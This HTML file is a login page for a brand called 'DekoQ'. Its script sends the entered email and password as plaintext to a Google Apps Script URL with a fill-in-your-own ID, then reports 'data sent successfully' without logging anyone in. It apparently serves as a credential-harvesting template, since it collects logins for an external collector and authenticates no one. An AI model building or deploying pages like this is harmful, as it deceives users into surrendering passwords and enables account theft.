<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }
    .container h1 {
      font-size: 3rem;
      margin: 0;
    }
    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }
    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }
    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
      display: block;
    }
    .input-wrapper {
      position: relative;
      margin-bottom: 1rem;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      font-size: 1rem;
      padding: 0.8rem 2.5rem 0.8rem 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      height: 44px;
      line-height: 1.2rem;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      width: 20px;
      height: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .toggle-password svg {
      width: 20px;
      height: 20px;
      fill: #333;
      pointer-events: none;
    }
    button[type="submit"] {
      width: 100%;
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
      font-size: 1rem;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <div class="input-wrapper">
          <input type="email" id="email" name="email" required placeholder="Value" />
        </div>

        <label for="password">Password</label>
        <div class="input-wrapper">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <span class="toggle-password" onclick="togglePassword()" id="toggleIcon">
            <!-- eye open -->
            <svg viewBox="0 0 16 16">
              <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM8 5.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5z"/>
            </svg>
          </span>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.querySelector("#form");
    const scriptURL = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec"; // ใส่ของคุณตรงนี้

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
      .then(async response => {
        const text = await response.text();
        if (response.ok) {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        } else {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        }
      })
      .catch(error => {
        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        console.error("Fetch Error!", error);
      });
    });

    function togglePassword() {
      const pwdInput = document.getElementById("password");
      const toggleIcon = document.getElementById("toggleIcon");

      if (pwdInput.type === "password") {
        pwdInput.type = "text";
        toggleIcon.innerHTML = `
          <svg viewBox="0 0 16 16">
            <path d="M13.359 11.238C14.134 10.386 14.814 9.343 15.297 8c-.76-2.055-3.36-5.5-7.297-5.5a7.13 7.13 0 0 0-2.32.392l1.406 1.406A2.5 2.5 0 0 1 10.7 9.2l1.406 1.406c.382-.35.735-.734 1.153-1.157zM3.173 2.173 2.12 3.226l2.016 2.016C2.412 6.375 1.088 8 1.088 8s3 5.5 8 5.5c.81 0 1.57-.13 2.28-.362l2.02 2.02 1.06-1.06-12-12z"/>
          </svg>`;
      } else {
        pwdInput.type = "password";
        toggleIcon.innerHTML = `
          <svg viewBox="0 0 16 16">
            <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM8 5.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5z"/>
          </svg>`;
      }
    }
  </script>
</body>
</html>
